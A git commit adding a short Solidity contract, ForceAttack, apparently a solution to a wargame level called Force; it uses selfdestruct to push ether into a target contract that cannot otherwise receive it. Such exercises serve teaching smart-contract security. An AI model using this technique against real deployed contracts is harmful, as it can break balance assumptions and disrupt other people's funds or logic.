578fc5b2710f2034d9bb66dabe9931439337a403
Aitor Zaldua <aitor.zaldua@draftdigital.org>
2022-10-19 21:43:48 +0200

    force

---
+++ contracts/ForceAttack.sol
@@ -0,0 +1,23 @@
+//SPDX-License-Identifier: MIT
+pragma solidity ^0.8.4;
+
+import "./Force.sol";
+
+import "hardhat/console.sol";
+
+contract ForceAttack {
+  
+    Force public victimContract;
+
+    constructor (address _victimContractAddr) {
+        victimContract = Force(payable(_victimContractAddr));
+    }
+
+    function attack () public payable {
+        require(msg.value > 0);
+        address payable addr = payable(address(victimContract));
+        selfdestruct(addr);
+
+    }
+
+}
